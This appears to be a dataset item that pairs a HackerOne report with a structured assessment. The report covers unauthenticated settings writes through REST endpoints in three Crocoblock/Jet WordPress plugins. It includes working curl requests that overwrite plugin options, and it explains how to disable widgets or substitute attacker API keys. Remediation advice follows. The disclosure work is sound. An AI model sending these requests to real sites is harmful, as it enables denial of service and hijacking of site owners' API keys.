# ACCESS_CONTROL — h1

- source: h1
- class: access_control
- cwe: CWE-862
- severity: medium
- program: essity
- quality_score: 13

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** Unauthenticated Plugin Settings Modification on Three Crocoblock/Jet Plugins
**Affected Asset:** https://www.familiainstitucional.com.bo

**Vulnerability Description:**
## Summary

Three Crocoblock (Jet) plugins expose REST API endpoints that allow unauthenticated users to modify plugin settings via POST requests without any authentication or authorization check. The endpoints validate and parse the POST body (rejecting malformed JSON with a 400 error), then persist the submitted key-value pairs into the WordPress `wp_options` table. The primary exploitable setting is `avaliable_widgets`, which controls which Elementor widgets are active site-wide  an attacker can disable all JetElements widgets to break page layouts, or modify API keys (Google Maps, Mailchimp, weather, Instagram) to attacker-controlled values.

## Affected Endpoints

| Endpoint | Status |
|---|---|
| `POST /wp-json/jet-elements-api/v1/plugin-settings` | Confirmed unauth write |
| `POST /wp-json/jet-woo-builder-api/v1/plugin-settings` | Confirmed unauth write |
| `POST /wp-json/jet-woo-product-gallery-api/v1/plugin-settings` | Confirmed unauth write |

## Steps to Reproduce

### Step 1  Confirm the endpoint processes input (not a no-op)
Send invalid JSON  the endpoint rejects it with a parse error, proving it actively processes the body:
```bash
curl -s "https://████████/wp-json/jet-elements-api/v1/plugin-settings" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{invalid json!!!'
```

Response (400  input validation is happening):
```json
{"code":"rest_invalid_json","message":"Ha pasado un cuerpo JSON no válido.","data":{"status":400,"json_error_code":4,"json_error_message":"Syntax error"}}
```

### Step 2  Send valid data without authentication
```bash
curl -s "https://████████/wp-json/jet-elements-api/v1/plugin-settings" \
  -X POST \
  -d "api_key=[REDACTED_TOKEN]"
```

Response (200  accepted and saved):
```json
{"status":"success","message":"Settings have been saved"}
```

No cookies, no `X-WP-Nonce` header, no authentication of any kind. The admin panel's own JavaScript (`jet-elements-admin.js`) sends the same request format via `jQuery.ajax` POST to `settingsApiUrl`  confirming the endpoint is designed to accept form-encoded data.

### Step 3  Confirm all three endpoints
```bash
# JetWooBuilder
curl -s "https://████████/wp-json/jet-woo-builder-api/v1/plugin-settings" \
  -X POST -H "Content-Type: application/json" -d '{}'
# Response: {"status":"success","message":"Settings have been saved"}

# JetWooProductGallery  
curl -s "https://████████/wp-json/jet-woo-product-gallery-api/v1/plugin-settings" \
  -X POST -H "Content-Type: application/json" -d '{}'
# Response: {"status":"success","message":"Settings have been saved"}
```

## Exploitable Settings (from admin JS source analysis)

The admin panel JavaScript (`jet-elements-admin.js`) reveals the settings s

## Analysis / Response

**Vulnerability Class:** access_control
**CWE:** CWE-862
**Weakness:** Missing Authorization
**Severity:** medium
**Endpoint Pattern:** POST /wp-json/jet-elements-api/v1/plugin-settings

**Impact Assessment:**
- **Denial of Service**  setting `avaliable_widgets` keys to `"false"` disables JetElements widgets site-wide, breaking any page that uses them (sliders, carousels, counters, etc.)
- **API key hijacking**  overwriting `api_key` (Google Maps) with an attacker-controlled key redirects API billing and allows the attacker to harvest geolocation query data
- **Configuration corruption**  arbitrary key-value pairs can be written to plugin options, potentially triggering errors or unexpected behavior

**Remediation:**
1. **Update all Crocoblock/Jet plugins** to the latest versions
2. **Add `permission_callback`** to the REST route registration requiring `manage_options` capability
3. **Add nonce verification** via `X-WP-Nonce` header check
